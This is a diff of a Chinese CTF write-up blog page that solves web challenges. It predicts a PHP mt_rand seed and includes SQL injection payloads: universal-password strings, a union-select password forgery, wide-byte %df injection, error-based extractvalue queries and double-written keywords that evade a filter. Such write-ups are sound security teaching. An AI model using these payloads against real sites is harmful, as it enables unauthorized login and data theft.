@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png">
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png">
 <meta property="article:published_time" content="2020-02-04T06:19:53.000Z">
-<meta property="article:modified_time" content="2020-02-04T12:46:06.108Z">
+<meta property="article:modified_time" content="2020-02-04T12:48:36.708Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -163,31 +163,45 @@
 
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p>访问首页提示</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜字符串游戏(大小写字母+数字)，猜中全部20位得flag+送去非洲，你不小心偷看到了一部分是：</span><br><span class="line">4unkksWvpD</span><br></pre></td></tr></table></figure>
+
 <p>查看源代码无果，搜索发现是和广外第三届网络安全大赛的题差不多，开始解题</p>
 <p>在network网络包里发现check.php源代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">4unkksWvpD</span><br><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure>
+
 <p>加密过程为在0~999999999之间取一个随机数作为随机函数的种子，然后用随机函数mt_rand()产生随机数进行加密，给出加密结果的前十位，求所有的结果，但是伪随机数只要种子一样，给出的随机数就是一样的，<br>伪随机数爆破工具 <a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></p>
 <p>位移量偏移脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1&#x3D;&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">s2&#x3D;&quot;4unkksWvpD&quot;</span><br><span class="line">for i in s2:</span><br><span class="line">    result&#x3D;str(s1.index(i)-1)+&#39; &#39;+str(s1.find(i)+1)+&#39; &#39;+ &#39; 0 61&#39;</span><br><span class="line">    print(result,end&#x3D;&#39; &#39;)</span><br></pre></td></tr></table></figure>
+
 <p>得到种子序列</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29 31  0 61 19 21  0 61 12 14  0 61 9 11  0 61 9 11  0 61 17 19  0 61 57 59  0 61 20 22  0 61 14 16  0 61 38 40  0 61</span><br></pre></td></tr></table></figure>
+
 <p>用种子序列爆破种子</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time .&#x2F;php_mt_seed 29 31  0 61 19 21  0 61 12 14  0 61 9 11  0 61 9 11  0 61 17 19  0 61 57 59  0 61 20 22  0 61 14 16  0 61 38 40  0 61</span><br></pre></td></tr></table></figure>
-<p>得到时间种子<br><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png" alt><br>给出PHP脚本</p>
+
+<p>得到时间种子</p>
+<p><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png" alt></p>
+<p>给出PHP脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function wp_generate_password($length) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;</span><br><span class="line">    $password &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">        $password .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    return $password;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(145562347); &#x2F;&#x2F;手工添加了这个种子</span><br><span class="line">$answer &#x3D; wp_generate_password(20);</span><br><span class="line">echo $answer;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到加密结果<br><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png" alt><br>提交即可得到flag</p>
+<p>得到加密结果</p>
+<p><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png" alt></p>
+<p>提交即可得到flag</p>
 <h2 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h2><p>题目说明</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</span><br></pre></td></tr></table></figure>
+
 <p>提交万能密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;#</span><br><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
 <p>登录失败，查看源码<br>在search.php发现加密字符串</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
+
 <p>base32+base64解密得</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
+
 <p>在注入万能密码时提示了don’t hack me,所以应该存在过滤，fuzz一波<br>username存在以下过滤,可能不全,但是可以union select 就可以操作</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or、&#x3D;、(、）、order、floor</span><br></pre></td></tr></table></figure>
+
 <p>测字段数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">对比差异可以判断字段数为3</span><br><span class="line">因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">对比差异可以判断字段数为3</span><br><span class="line">因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</span><br></pre></td></tr></table></figure>
 <p>name=’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 说明：202cb962ac59075b964b07152d234b70&#x3D;md5(123)</span><br><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">### 代码参考</span><br></pre></td></tr></table></figure>
 <?php
@@ -214,11 +228,11 @@ else{
     echo "nonono";
 }
 ?>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## BabySqli2.0</span><br><span class="line">### 题目说明</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## BabySqli2.0</span><br><span class="line"></span><br><span class="line">### 题目说明</span><br></pre></td></tr></table></figure>
 <p>我对网站进行了加固，还支持了中文账号，这下你们没辙了吧？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">鲁迅说过，一提到中文，马上想到gbk,马上想到宽字节注入</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">鲁迅说过，一提到中文，马上想到gbk,马上想到宽字节注入</span><br></pre></td></tr></table></figure>
 <p>admin’ 提示没有此用户<br>admin%df’ 数据库报错,说明确实是宽字节注入，然后开始报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### waf探测</span><br><span class="line">查表名时出现了极其奇怪的情况，后来发现是对关键词进行了过滤，而查询数据库名时，extractvalue()即使没有select,也可以查出来数据库名，日，于是先fuzz一波关键词，以后要记得先探测waf，发现至少有以下关键词被过滤,但双写可以绕过</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### waf探测</span><br><span class="line"></span><br><span class="line">查表名时出现了极其奇怪的情况，后来发现是对关键词进行了过滤，而查询数据库名时，extractvalue()即使没有select,也可以查出来数据库名，日，于是先fuzz一波关键词，以后要记得先探测waf，发现至少有以下关键词被过滤,但双写可以绕过</span><br></pre></td></tr></table></figure>
 <p>union select where</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 注数据库名</span><br></pre></td></tr></table></figure>
 <p>1%df’ and extractvalue(1,concat(1,(seselectlect database()),1))%23    </p>
